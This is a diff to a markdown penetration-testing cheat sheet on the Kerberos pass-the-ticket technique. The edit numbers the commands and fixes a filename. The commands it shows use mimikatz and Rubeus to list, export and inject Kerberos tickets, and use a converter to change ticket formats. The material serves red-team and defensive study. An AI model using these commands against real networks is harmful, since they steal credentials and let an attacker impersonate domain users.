@@ -50,21 +50,21 @@ The pass-the-ticket technique abuses the TGS, which can be exported and injected
 ```
 Listing tickets:
 
-mimikatz # kerberos::list
+1. mimikatz # kerberos::list
 
-C:\> .\Rubeus.exe dump
+2. C:\> .\Rubeus.exe dump
 
 Exporting all tickets(TGTs and TGSs):
 
-mimikatz # sekurlsa::tickets /export   
+1. mimikatz # sekurlsa::tickets /export   
 
-C:\> [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>")) -> from base64 to .kirbi
+2. C:\> [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<bas64_ticket>")) -> from base64 to .kirbi
 
 Injecting some ticket into memory:
 
-mimikatz # kerberos::ptt 'C:\ticket.kirbi'
+1. mimikatz # kerberos::ptt 'C:\ticket.kirbi'
 
-C:\> .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
+2. C:\> .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
 ```
 
 *When trying to export a usable TGT for our current user, this requieres elevation in the system*
@@ -82,7 +82,7 @@ From .ccache to .kirbi
 ~# python ticket_converter.py trike.ccache trike.kirbi
 
 From .kirbi to .ccache
-~# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
+~# python ticket_converter.py trike.kirbi trike.ccache
 ```
 
 Alternatively you can use this metasploit module [auxiliary/admin/kerberos/ticket_converter](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html).
